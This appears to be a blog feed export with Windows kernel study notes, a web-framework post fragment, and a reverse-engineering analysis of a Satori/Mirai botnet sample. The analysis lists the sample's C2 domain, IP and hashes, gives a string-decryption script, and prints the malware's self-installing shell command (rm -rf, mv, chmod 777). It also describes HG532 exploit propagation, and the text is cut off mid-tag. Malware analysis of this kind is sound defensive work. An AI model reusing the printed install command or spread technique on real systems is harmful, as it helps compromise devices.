templates</span><br></pre></td></tr></table></figure><p><code>views.py</code>是视图、<code>models.py</code>是ORM对象、<code>asgi.py\wsgi.py</code>是HTTP服务、<code>setting.py</code>是设置、<code>url.py</code>是路由，项目从<code>manage,py</code>开始，那么就可以整理一下原来的代码了。</p><p>那么目前项目的结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">├── config</span><br><span class="line">│   ├── client.conf</span><br><span class="line">│   ├── database.conf        </span><br><span class="line">│   ├── server.conf</span><br><span class="line">│   ├── server.crt</span><br><span class="line">│   ├── server.csr</span><br><span class="line">│   └── server.key</span><br><span class="line">├── manage.py</span><br><span class="line">├── README.md</span><br><span class="line">├── requirements.txt</span><br><span class="line">├── rprint.py</span><br><span class="line">├── server</span><br><span class="line">│   ├── db.py</span><br><span class="line">│   ├── models.py     </span><br><span class="line">│   ├── serialization.py</span><br><span class="line">│   ├── server.py</span><br><span class="line">│   ├── urls.py</span><br><span class="line">│   ├── utils</span><br><span class="line">│   │   ├── autoreload.py</span><br><span class="line">│   │   ├── epollcontrol.py</span><br><span class="line">│   │   ├── functional.py</span><br><span class="line">│   └── views.py</span><br><span class="line">└── test</span><br></pre></td></tr></table></figure><ul><li><p><strong>config</strong></p><p>包含数据库配置(<code>database.conf</code>)，SSL使用的证书(<code>server.csr</code>)和key(<code>server.key</code>)，socket服务配置(<code>server.conf</code>)</p></li><li><p><strong>utils</strong></p><p>一些帮助模块</p></li><li><p><strong>server</strong></p><p>主要功能实现，包括路由、epoll管理、数据库相关，其中<code>views.py</code>可以编写api，<code>urls.py</code>中设置路由</p></li><li><p><strong>test</strong></p><p>一些测试用例</p></li></ul><p>目前应该专注于第一块：优化epoll性能以及wsgi、asgi的实现。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;从0到1开发一个勉强能用的python web“框架”&lt;/p&gt;
&lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/Joe1sn/muud&quot;&gt;https://github.com/Joe1sn/muud&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="muud" scheme="https://joe1sn.eu.org/tags/muud/"/>
    
    <category term="web framework" scheme="https://joe1sn.eu.org/tags/web-framework/"/>
    
  </entry>
  
  <entry>
    <title>【win内核原理与实现】I. Windows系统结构</title>
    <link href="https://joe1sn.eu.org/2023/05/24/windows-kernel-1-baisc/"/>
    <id>https://joe1sn.eu.org/2023/05/24/windows-kernel-1-baisc/</id>
    <published>2023-05-24T03:28:39.000Z</published>
    <updated>2023-06-01T14:31:05.149Z</updated>
    
    <content type="html"><![CDATA[<p>Windows系统结构还有引导过程</p><span id="more"></span><h2 id="ia-大致结构"><a class="markdownIt-Anchor" href="#ia-大致结构"></a> I.a 大致结构</h2><p>windows内核是从<code>windows NT</code>内核发展过来的，从开始就和硬件的发展息息相关。</p><p>Windows采用双模式（<code>dual mode</code>）结构来保护操作系统内核不受应用程序的错误而出现崩溃</p><p><img src="https://img.joe1sn.top/uploads/big/268a5b458897e4a4a77a3368415c50a7.png" alt="img" /></p><p>windows的原始设计是一个支持多环境子系统的os，它还支持POSIX和OS/2环境子系统.为他们提供仿真执行环境</p><h2 id="ib-windows内核组成结构"><a class="markdownIt-Anchor" href="#ib-windows内核组成结构"></a> I.b windows内核组成结构</h2><p><img src="https://img.joe1sn.top/uploads/big/b2e4ecf4e493b23fd28d8640d524aac3.png" alt="内核组成结构.drawio" /></p><p>关于函数的开头</p><ul><li><code>nt</code>：内核提供的服务</li><li><code>Ldr</code>：映像加载器函数</li><li><code>Csr</code>：Windows子进程通讯函数</li><li><code>Dbg</code>：调试函数</li><li><code>Etw</code>：系统时间函数</li><li><code>Rtl</code>：运行支持函数</li></ul><p>执行体API函数接收的参数来自各种应用程序，通常会在程序的最开始处，对所接受的参数逐一探查他们的可访问性。</p><h1 id="ii-windows内核关键组件"><a class="markdownIt-Anchor" href="#ii-windows内核关键组件"></a> II. windows内核关键组件</h1><h2 id="hal-硬件抽象层"><a class="markdownIt-Anchor" href="#hal-硬件抽象层"></a> HAL 硬件抽象层</h2><p>HAL通常是一个独立的动态链接库，windows自身携带多种HAL，但是在系统安装的时候只会选择一种，改名为<code>hal.dll</code>。涉及中断控制器、单处理器/多处理器硬件断点。</p><h2 id="内核微内核"><a class="markdownIt-Anchor" href="#内核微内核"></a> 内核（微内核）</h2><p>在内核模块<code>ntoskrnl.exe</code>中的上层部分为执行体，下层最接近HAL的就是内核。负责进程调度、中断和异常处理，核心任务是尽可能让系统中的所有处理器变得高效。</p><p>windows内核使用抢占式调度，由于采用面向对象的设计，使得它主要面向两个对象：<strong>分发器</strong> 和 <strong>控制</strong> 两个对象</p><ul><li>分发器对象：实现各种同步功能。影响线程调度，主要用于 <strong>事件(event)</strong> <strong>突变体(mutant) 信号量(semaphore) 进程(process) 线程(thread) 队列(query) 门(gate) 定时器(timer)</strong></li><li>控制对象：用于控制内核的操作，不影响线程调度。包括 <strong>异步调用(APC) 延迟过程调用(DPC) 中断对象</strong></li></ul><h2 id="执行体"><a class="markdownIt-Anchor" href="#执行体"></a> 执行体</h2><p>在内核模块<code>ntoskrnl.exe</code>中的上层部分，包含5种类型的函数</p><ul><li>被导出的、可以在用户模式下调用的函数。位于 <code>ntdll.dll</code> 中。一般就是win API</li><li>没有被导出、可以在用户模式下调用的函数。比如常见的反调试函数，包括各种LRC(<code>Local Process Call</code>，本地调用过程)、各种查询函数和专业函数。</li><li>只能在内核模式下调用的导出函数。在<code>windows DDK</code>中有文档。</li><li>执行体之间内部调用，未被文档化的函数</li><li>一个组件的内置函数</li></ul><p>其中组件包括</p><ul><li>进程和线程管理器：负责进程/线程的CURD</li><li>内存管理：虚拟内存</li><li>安全引用监视器（SRM）：维护本地计算机的安全策略</li><li>I/O管理器</li><li>缓存管理器：允许磁盘将文件映射到内存中</li><li>配置管理器：负责注册表的实现</li><li>即插即用管理器</li></ul><p>还有的函数负责对执行体进行管理</p><ul><li>对象管理器：执行体对象的CURD</li><li>LPC设施：负责同一设备的的客户进程和服务进程的消息传递，对应的是远程过程调用（RPC）</li><li>运行时库函数</li><li>执行体支持例程：内存的分配、互锁内存的转换</li></ul><h2 id="设备驱动程序"><a class="markdownIt-Anchor" href="#设备驱动程序"></a> 设备驱动程序</h2><p>驱动文件（<code>.sys</code>），漏洞挖掘存在于<code>IOCTL</code></p><h2 id="文件系统存储管理"><a class="markdownIt-Anchor" href="#文件系统存储管理"></a> 文件系统/存储管理</h2><p>主要是<code>ntfs.sys</code>。漏洞挖掘存在于<code>CLFS</code>（通用日志文件系统）。</p><h2 id="网络"><a class="markdownIt-Anchor" href="#网络"></a> 网络</h2><p>windows套接字、winInet、NetBIOS、RPC</p><h1 id="iii-windows子系统"><a class="markdownIt-Anchor" href="#iii-windows子系统"></a> III. windows子系统</h1><p>在上面的内核部分已经实现了对硬件的简单访问控制，那么就会在次基础上进行跟高层次的建设。</p><p>在PE文件的头部域<code>Subssytem</code>中指定了该程序会在那个子环境中运行。</p><p>子系统也分为用户模式和内核模式，<strong>核心部分是 win32k.sys</strong>。子系统的DLL链接到应用程序中，包括<code>kernel32.dll</code> <code>user32.dll</code> <code>gdi32.dll</code> <code>advapi.dll</code>，负责实现文档化的windows函数。</p><p>win32k.sys同时也负责向内核注入一系列出调函数(callout)，一旦调用了win32k.sys的任何一个系统服务，这个程序就会变成一个GDI线程</p><p>核心功能可以分为：</p><ul><li><p>窗口管理</p><p>由windows子进程<code>csrss.exe</code>负责控制台窗口功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">子系统会话---&gt;交互式窗口站---&gt;默认桌面---&gt;顶级窗户口列表-&gt;子窗口</span><br><span class="line">          |             |_&gt;登录窗口</span><br><span class="line">          |             |_&gt;屏幕保护窗口</span><br><span class="line">          |-&gt;非交互式窗口--&gt;不可见桌面</span><br></pre></td></tr></table></figure></li><li><p>图形设备接口(GDI)</p><p>主要是图形支持，设计Direct3D等</p></li></ul><h1 id="iv-安全性管理"><a class="markdownIt-Anchor" href="#iv-安全性管理"></a> IV. 安全性管理</h1><p>三个核心组件：<strong>winlogon</strong>、<strong>SRM</strong> 和 <strong>lsass</strong></p><p>winlogon 和 lsass 是两个用户模式进程， 而 SRM 是 Windows 执行体中的组件</p><p><img src="https://img.joe1sn.top/uploads/big/9af8f1b52745a7587e3e81ae3a156eaf.png" alt="image-20230601094755027" /></p><ul><li>SRM（Security Reference Monitor安全引用监视器），负责执行对象的安全访问检查、管理用户特权、生成安 全审计消息，并且定义了访问令牌数据结构来表示一个安全环境。</li><li>Winlogon，负责响应 SAS（安全注意序列），以及管理交互式登录会话。当用户登 录到系统中时，winlogon 创建一个初始进程，并进一步由它创建外壳（shell）进程。</li><li>Lsass（Local Security Authentic SubSystem本地安全权威子系统），负责本地系统的安全策略，同时，它也认证用户的 身份，以及将安全审计消息发送到系统的事件日志中。</li><li>SAM（安全账户管理器）数据库，包含了本地用户和用户组，以及它们的口令和其 他属性。它位于注册表的 HKLM\SAM 下面。由于 HKLM\SAM 键只允许本地系统账 户访问，所以，除非用户在 Local System 账户下运行 regedit.exe 工具，否则无法访问 HKLM\SAM 子树。</li><li>LSA 策略数据库，包含了有关当前系统的一些信息，譬如谁允许访问系统以及如何 访问（交互式登录、网络登录或者以服务方式登录）；分配给谁哪些特权；安全审计 如何进行等。如同 SAM 数据库一样，LSA 策略数据库也存储在注册表中，位于 HKLM\SECURITY 下面。同样地，除了 Local System 账户以外的其他账户均无法访 问 HKLM\SECURITY 子树。</li></ul><p>winlogon 负责<strong>系统登录</strong>，包括对用户身份的认证；<strong>lsass 负责管理系统本地安全策略</strong>，并且将这些策略通知到内核中的 SRM。在内核 中，SRM 负责实现基于对象的访问控制以及系统全局安全策略的实施。</p><h2 id="关于一些提权"><a class="markdownIt-Anchor" href="#关于一些提权"></a> 关于一些提权</h2><p>在 Windows 中，特权是由 LUID 对象来标识的，LUID 代表一个本地唯一标识符（Locally  Unique Identifier）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LUID_AND_ATTRIBUTES</span> &#123;</span> </span><br><span class="line"> LUID Luid; </span><br><span class="line"> ULONG Attributes; </span><br><span class="line"> &#125; LUID_AND_ATTRIBUTES, * PLUID_AND_ATTRIBUTES; </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_PRIVILEGE_ENABLED_BY_DEFAULT (0x00000001L) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_PRIVILEGE_ENABLED (0x00000002L) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_PRIVILEGE_REMOVED (0X00000004L) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_PRIVILEGE_USED_FOR_ACCESS (0x80000000L)</span></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/5b43b7eea8f959062d9d429d24c4b7ef.png" alt="image-20230601100327861" /></p><p>Windows 内核中定义了一组特权，即类型为 LUID 的 Se全局变量。Windows 内核中，与安全相关的函数以“Se”作为前缀，有一些安全函数还存在对应的系 统服务。这些系统服务函数的名称以“Nt”作为前缀，后面部分与“Se”函数相同。</p><h1 id="v-windows的引导过程"><a class="markdownIt-Anchor" href="#v-windows的引导过程"></a> V. Windows的引导过程</h1><p>最开始也是从经典的MBR开始，然后是ntldr的osloader。</p><p>在osloader中将物理地址转为虚拟地址，该过程可见：windows_kernel_driver_2中对CR3、CR4寄存器的控制。</p><p>之后osloader加载NTDETECT.COM程序，利用系统BIOS查询系统基本设备，在引导过程的后期被存放到注册表 HKLM\HARDWARE\DESCRIPTION</p><p>os loader 加载内核模块映像文件，默认为 ntoskrnl.exe，以及 HAL 映像文件，默 认为 hal.dll。再加载注册表的 SYSTEM 储巢，即\WINDOWS\system32\config\system 文件。</p><p><img src="https://img.joe1sn.top/uploads/big/1b982f19ef122b020f794aa867004e2b.png" alt="image-20230601100916238" /></p><p>然后是内核的初始化，此入口函数为 <code>KiSystemStartup</code></p><p>为了解决在初始化过程中的相互依赖 性问题，内核的初始化分两个阶段进行，称为阶段 0 和阶段 1。大多数内核组件的初始化函 数相应地带有一个整数参数，以指明一次调用是阶段 0 初始化还是阶段 1 初始化，而有些组 件的初始化函数通过检查一个全局变量 InitializationPhase 的值来判断当前处于哪个阶段。</p><p>阶段 0 初始化的目的是，将阶段 1 初始化所要用到的基 本数据结构建立起来。这时中断被禁止，调整IDT、TSS、PCR等。接着调用 KiInitializeKernel 函数，执行内核初始化。最后，当前线程蜕变成一个空闲线程。</p><p><img src="https://img.joe1sn.top/uploads/big/37b5a3335cbcb32366e40e7111162964.png" alt="image-20230601101312886" /></p><h1 id="v-windows发布历史"><a class="markdownIt-Anchor" href="#v-windows发布历史"></a> V. Windows发布历史</h1><p>MicroSoft在操作系统领域中最开始起源于MS-DOS，随后演变出了两个分支，最开始的<code>Win 95/98/Me</code>，之后就是基于<code>Windows NT</code>的内核版本的<code>Window XP/7/8/10/vista</code>的版本。</p><table><thead><tr><th>版本</th><th>发布日期</th><th>主要特点</th><th>内核版本</th></tr></thead><tbody><tr><td>Windows 1.0</td><td>1985年11月</td><td>初始版本，提供基本的图形用户界面和应用程序支持</td><td>1.0</td></tr><tr><td>Windows 2.0</td><td>1987年12月</td><td>引入了窗口重叠、图标和键盘快捷键等改进</td><td>2.0</td></tr><tr><td>Windows 3.0</td><td>1990年5月</td><td>支持多任务处理和TrueType字体，用户界面大幅改进</td><td>3.0</td></tr><tr><td>Windows 95</td><td>1995年8月</td><td>具有开始菜单、任务栏和32位应用程序支持的重要版本</td><td>4.0</td></tr><tr><td>Windows 98</td><td>1998年6月</td><td>引入了对USB设备和DVD光盘的支持，改进了系统稳定性</td><td>4.10</td></tr><tr><td>Windows 2000</td><td>2000年2月</td><td>强化了系统稳定性和安全性，提供了企业级特性</td><td>5.0</td></tr><tr><td>Windows XP</td><td>2001年10月</td><td>引入了全新的用户界面、系统恢复功能和多用户支持</td><td>5.1</td></tr><tr><td>Windows Vista</td><td>2007年1月</td><td>全新的用户界面、更高的安全性和系统稳定性</td><td>6.0</td></tr><tr><td>Windows 7</td><td>2009年10月</td><td>优化了用户界面和性能，改进了任务栏和窗口管理</td><td>6.1</td></tr><tr><td>Windows 8</td><td>2012年10月</td><td>引入了全新的开始屏幕和触摸优化的用户界面</td><td>6.2</td></tr><tr><td>Windows 10</td><td>2015年7月</td><td>统一了桌面和移动设备平台，引入了Windows应用商店</td><td>10.0</td></tr><tr><td>Windows 11</td><td>2021年10月</td><td>新的用户界面设计、改进的性能和安全性，支持Android应用</td><td>10.0</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;p&gt;Windows系统结构还有引导过程&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>Mirai Botnet分支Satori分析</title>
    <link href="https://joe1sn.eu.org/2023/03/25/mirai-bota/"/>
    <id>https://joe1sn.eu.org/2023/03/25/mirai-bota/</id>
    <published>2023-03-25T10:42:45.000Z</published>
    <updated>2023-06-01T14:29:56.735Z</updated>
    
    <content type="html"><![CDATA[<p>暂时先更新这么多，后面应该还有相关作者被抓的一些消息和更多功能的逆向</p><span id="more"></span><h2 id="基本情况"><a class="markdownIt-Anchor" href="#基本情况"></a> 基本情况</h2><table><thead><tr><th>名称</th><th>x86_64</th></tr></thead><tbody><tr><td>MD5</td><td>fe7ca3b588e342f79c7814bb75dc24d7</td></tr><tr><td>SHA256</td><td>e436196f047741070c580695f5444e0c2cdd175c88f68affdc9230d09a71c978</td></tr><tr><td>Domain</td><td><a href="http://botnet.nguyennghi.info">botnet.nguyennghi.info</a></td></tr><tr><td>ip</td><td>103.183.118.73</td></tr></tbody></table><h2 id="逆向分析"><a class="markdownIt-Anchor" href="#逆向分析"></a> 逆向分析</h2><h3 id="基本情况-2"><a class="markdownIt-Anchor" href="#基本情况-2"></a> 基本情况</h3><img src="https://img.joe1sn.top/uploads/big/2dd85cc12949bcd1a7da5287ada77fed.png" alt="image-20230319130912500" style="zoom:50%;" /><p>64位ELF可执行文件</p><p><img src="https://img.joe1sn.top/uploads/big/ff35ebac2e5f17da95a18f650aa1c5f6.png" alt="image-20230319131036258" /></p><h3 id="逆向工程"><a class="markdownIt-Anchor" href="#逆向工程"></a> 逆向工程</h3><p>通过start找到main函数</p><p><img src="https://img.joe1sn.top/uploads/big/7f9086994f2d20a717a754d858293a59.png" alt="image-20230319131156050" /></p><p>使用IDApython脚本对类似的库函数实现进行函数重命名</p><p><img src="https://img.joe1sn.top/uploads/big/6ae388e053568f7e0b6209cf80082bbd.png" alt="image-20230319131304684" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> ida_name</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> func_ea <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    func = idaapi.get_func(func_ea)</span><br><span class="line">    name = idaapi.get_func_name(func_ea)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> head <span class="keyword">in</span> idautils.Heads(func.start_ea, func.end_ea):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            code = idc.GetDisasm(head)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;syscall&quot;</span> <span class="keyword">in</span> code:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Function: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(name).ljust(<span class="number">0x40</span>,<span class="string">&#x27;-&#x27;</span>))</span><br><span class="line">                <span class="built_in">print</span>(code[<span class="number">21</span>:].ljust(<span class="number">0x30</span>,<span class="string">&quot;=&quot;</span>))</span><br><span class="line">                ida_name.set_name(func.start_ea, code[<span class="number">21</span>:])</span><br><span class="line">                idc.set_func_flags(func.start_ea, idc.get_func_flags(func_ea) | idaapi.FUNC_LIB)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/9699218d050e3277b97c149a5001e218.png" alt="image-20230319131712988" /></p><p><strong>main函数</strong></p><ol><li><p>首先创建向<code>8.8.8.8:13568</code>的socket连接，通过<code>getsockname</code>测试网络是否连通并获得本机ip地址</p><p><img src="https://img.joe1sn.top/uploads/big/e1856f6f33f0c1ef5976e312ad0722e2.png" alt="image-20230319133229045" /></p></li><li><p>初始化加密消息</p><p>由于使用未知版本的lib库进行静态编译，所以需要手动识别一些lib函数。</p><p>比如这里使用<code>malloc</code>分配并将密文使用<code>strncpy</code>将消息复制到堆中</p><p><img src="https://img.joe1sn.top/uploads/big/7058438640f17abd7da5ae8736403663.png" alt="image-20230319145038585" /></p></li><li><p>利用<code>pid</code>和随机数进行随机数生成，对进程进行随机改名</p><ul><li><p>将time生成的伪随机数和pid进行异或等操作得到随机数</p><p><img src="https://img.joe1sn.top/uploads/big/c3fa4dc9012d5d9d226257bc0a7ad6e8.png" alt="image-20230319145721197" /></p></li><li><p>通过位移等操作实现随机数的范围控制</p></li></ul><p><img src="https://img.joe1sn.top/uploads/big/c16e53f2ec6c8b3dd41d531f26f25633.png" alt="image-20230319145655202" /></p><ul><li><p>在之后使用<code>ptrcl</code>进行进程的重命名</p><p><img src="https://img.joe1sn.top/uploads/big/f9ee442f2eb39f67156721672c18f159.png" alt="image-20230319164552839" /></p></li></ul></li><li><p>拼接指令过后，修改相关信号变量值，并在<code>vfork</code>的<code>execl</code>中执行</p><ul><li><p>拼接命令字符串</p><p><img src="https://img.joe1sn.top/uploads/big/e8dc6791e9c8617b59761f5d15e5999c.png" alt="image-20230319164254112" /></p></li><li><p>设置信号量并使用vfork执行</p><p><img src="https://img.joe1sn.top/uploads/big/69316bf83fad9f326f58e874975dd2e6.png" alt="image-20230319164122065" /></p><p><img src="https://img.joe1sn.top/uploads/big/16fb3f0838f0cffc01c01207cb1f8c5c.png" alt="image-20230319163508664" /></p></li><li><p>vfork部分</p><p><img src="https://img.joe1sn.top/uploads/big/268aff2f4a3d3e64a33004ceef665ca9.png" alt="image-20230319164454462" /></p></li><li><p>执行的语句为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh sh -c rm -rf $root_random_name &amp;&amp; mkdir bin; &gt; $cur_random_name &amp;&amp; mv $pwd $root_random_name ; chmod 777 $root_random_name</span><br></pre></td></tr></table></figure><p>例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh sh -c rm -rf bin/watchdog &amp;&amp; mkdir bin \336\377\377\377\177; &gt;bin/watchdog &amp;&amp;  mv /home/test/Desktop/HackedByAlan/check/mirai bin/watchdog; chmod 777 bin/watchdog</span><br></pre></td></tr></table></figure><ol><li>随机选择  <code>&quot;/bin/busybox&quot;;</code>、<code>&quot;/bin/watchdog&quot;</code>、<code>&quot;/bin/systemd&quot;</code>中的一个（<code>$root_random_name</code>）中的一个<strong>删除</strong></li><li>当前文件夹创建<code>bin</code>目录</li><li>将当前目录下的病毒移动至创建的<code>bin</code>目录中，并重命名<code>$root_random_name</code></li><li>给予<code>bin/$root_random_name</code>最高权限</li></ol><p>通过多次运行可以成功实现，如果<code>&amp;&amp; mkdir bin \336\377\377\377\177</code>中没有乱码，那么就会执行后一句</p><p><img src="https://img.joe1sn.top/uploads/big/e6955edfd176db8c53e504286d3be6d7.png" alt="image-20230319230512195" /></p></li></ul></li><li><p>使用异或解密字符串并打印，完成后加密字符串</p><ul><li><p>过程</p><p><img src="https://img.joe1sn.top/uploads/big/2cf1740082e2104f5c6be1f730334279.png" alt="image-20230319173516052" /></p></li><li><p>利用其自身的解密脚本，可以解密所有密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">str1 = [ <span class="number">0x4C</span>, <span class="number">0x41</span>, <span class="number">0x5A</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>, <span class="number">0x5A</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x49</span>, <span class="number">0x5B</span>, <span class="number">0x57</span>, <span class="number">0x4B</span>, <span class="number">0x40</span>, <span class="number">0x40</span>, <span class="number">0x49</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x00</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x48</span>, <span class="number">0x41</span>, <span class="number">0x2E</span>]</span><br><span class="line">str2 = [<span class="number">0x4A</span>, <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>]</span><br><span class="line">str3 = [<span class="number">0x01</span>, <span class="number">0x5E</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x01</span>, <span class="number">0x2E</span>]</span><br><span class="line">str4 = [<span class="number">0x01</span>, <span class="number">0x4B</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x2E</span>]</span><br><span class="line">str5 = [<span class="number">0x01</span>, <span class="number">0x48</span>, <span class="number">0x4A</span>, <span class="number">0x2E</span>]</span><br><span class="line">str6 = [<span class="number">0x01</span>, <span class="number">0x4D</span>, <span class="number">0x43</span>, <span class="number">0x4A</span>, <span class="number">0x42</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>, <span class="number">0x2E</span>]</span><br><span class="line"></span><br><span class="line">key = <span class="number">0x6D53D2C2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher:<span class="built_in">list</span></span>):</span><br><span class="line">    v3 = key &amp; <span class="number">0xFF</span></span><br><span class="line">    v4 = key &gt;&gt; <span class="number">8</span></span><br><span class="line">    v5 = (key &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span></span><br><span class="line">    v6 = (key &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">        result += <span class="built_in">chr</span>((i^v3^v4^v5^v6 )&amp; <span class="number">0xFF</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;1&quot;</span>, decrypt(str1))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;2&quot;</span>, decrypt(str2))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;3&quot;</span>, decrypt(str3))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;4&quot;</span>, decrypt(str4))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;5&quot;</span>, decrypt(str5))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;6&quot;</span>, decrypt(str6))</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/23f89924f7290216402f2dbee10c1f43.png" alt="image-20230319220907909" /></p></li><li><p>加密字符串，由于是异或加密，所以加解密算法一致</p></li></ul></li></ol><p><img src="https://img.joe1sn.top/uploads/big/603b9a71f69d32f0b9937d4c40d4e2eb.png" alt="image-20230319174504355" /></p><p><img src="https://img.joe1sn.top/uploads/big/8c79bfcbe91463df2c3555e3de8b40d0.png" alt="image-20230319174521783" /></p><ol start="6"><li><p>合适函数表，讲函数放到一个table中</p><p><img src="https://img.joe1sn.top/uploads/big/6e49a88320fb86ab46e96687914965bd.png" alt="image-20230325174924309" /></p></li><li><p>使用<code>fork</code>获得子进程，打开<code>/proc</code>文件夹并读取其中的文件，关闭除必要进程外的所有进程</p><ul><li><p>打开<code>/proc/</code>文件夹</p><p><img src="https://img.joe1sn.top/uploads/big/fc58ad13d588c9c5bfd0718b076a8ec8.png" alt="image-20230325175147772" /></p><p><img src="https://img.joe1sn.top/uploads/big/c52029cd2018a1d2b7c8cd50bfb58c4b.png" alt="image-20230325175200591" /></p></li><li><p>关闭除必要进程外的所有进程</p><p><img src="https://img.joe1sn.top/uploads/big/f6c419b41761495db52182270509e87f.png" alt="image-20230325175235928" /></p></li></ul></li><li><p>使用SSDP协议进行网络发包，使用华为HG532远程命令执行漏洞（CVE-2017-17215）的payload进行发包，进行攻击</p><ul><li><p>进行攻击</p><ol><li><p>创建socket</p><p><img src="https://img.joe1sn.top/uploads/big/82f418b30b12d5cd5f0340a65dacecd5.png" alt="image-20230325175953274" /></p></li><li><p>设置 socket 选项，允许向组播地址发送数据</p><p><img src="https://img.joe1sn.top/uploads/big/5df10655306d34b61114564c0e610cf9.png" alt="image-20230325181258334" /></p></li><li><p>设置目标地址和端口号</p><p><img src="https://img.joe1sn.top/uploads/big/5fdd3eff4830d76f22e248fac58f4c1c.png" alt="image-20230325181453140" /></p></li><li><p>构造 M-SEARCH 请求报文，发送搜索请求</p><p><img src="https://img.joe1sn.top/uploads/big/f6ec95904237a3f131f02eb4eed5db82.png" alt="image-20230325175636859" /></p><p><img src="https://img.joe1sn.top/uploads/big/1a9561f1e58f0b6efcd84e98fa54dad6.png" alt="image-20230325175725576" /></p><p><img 